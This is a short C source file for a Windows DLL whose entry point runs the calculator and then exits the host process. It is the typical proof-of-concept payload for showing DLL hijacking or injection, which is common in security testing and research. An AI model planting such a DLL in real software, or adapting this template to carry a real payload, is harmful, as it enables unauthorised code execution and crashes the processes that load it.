#include <windows.h>


int owned()
{
	WinExec("calc", 0);
	exit(0);
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	owned();
	return 0;
}